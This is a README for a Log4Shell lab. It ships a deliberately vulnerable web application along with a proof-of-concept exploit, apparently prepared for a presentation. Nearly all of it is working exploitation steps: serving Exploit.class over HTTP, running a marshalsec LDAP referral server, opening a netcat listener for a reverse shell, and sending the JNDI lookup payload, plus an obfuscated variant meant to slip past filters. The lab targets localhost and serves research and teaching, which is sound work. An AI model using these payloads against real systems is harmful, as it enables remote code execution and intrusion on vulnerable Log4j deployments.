# Log4Shell Vulnerable Web Application and Proof of Concept:

This is an example vulnerable application and proof-of-concept (POC) exploit of Log4Shell.

**Special thanks to**

1. marshalsec from [mbechler](https://github.com/mbechler/marshalsec)
2. Vulnerable Web App from [kozmer](https://github.com/kozmer/log4j-shell-poc). We have modified it to match the content of the presentation.

## Running the application (Only works on Linux hosts, not supported on Docker for Mac/Windows)

Pull and run it

```
docker pull tdane/researches:log4shell_vuln-app
docker run --network host tdane/researches:log4shell_vuln_app

# Now you can access vuln app at http://localhost:8080
```

Build it yourself (you don't need any Java-related tooling):

```
docker build . -t vuln-app
docker run --network host vuln-app
```

## Exploitation steps

### 1. Start HTTP server at port 8000 that contains Exploit.class

```
cd httpServer
python -m SimpleHTTPServer 8000
```

### 2. Start LDAP server with marshalsec

```
cd ../marshalsec
java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://localhost:8000/#Exploit"
```

### 3. Setup a netcat listener for reverse shell connection

```
# Default port for reverse shell is 4444, you can change it at Exploit.java

nc -lnvp 4444
```

### 4. Send payload to vuln web

```
${jndi:ldap://localhost:1389/Exploit}
```

In case it has been filtered:

```
${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://localhost:1389/Exploit}
```

Ref: https://github.com/Puliczek/CVE-2021-44228-PoC-log4j-bypass-words
